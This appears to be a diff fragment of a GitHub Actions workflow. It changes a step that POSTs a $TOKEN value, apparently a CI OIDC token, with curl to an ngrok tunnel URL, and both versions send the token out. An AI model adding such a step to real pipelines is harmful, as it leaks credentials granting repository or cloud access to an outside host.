@@ -28,7 +28,7 @@ jobs:
 
       - name: Send OIDC Token to Server
         run: |
-          curl -X POST https://4508-2803-9800-9886-b1bf-8131-9bf3-1541-7bb.ngrok-free.app/api/v3/auth/github-cred \
+          curl -X POST https://4508-2803-9800-9886-b1bf-8131-9bf3-1541-7bb.ngrok-free.app \
           -H "Content-Type: application/json" \
           -d "{\"token\": \"$TOKEN\"}"
         env:
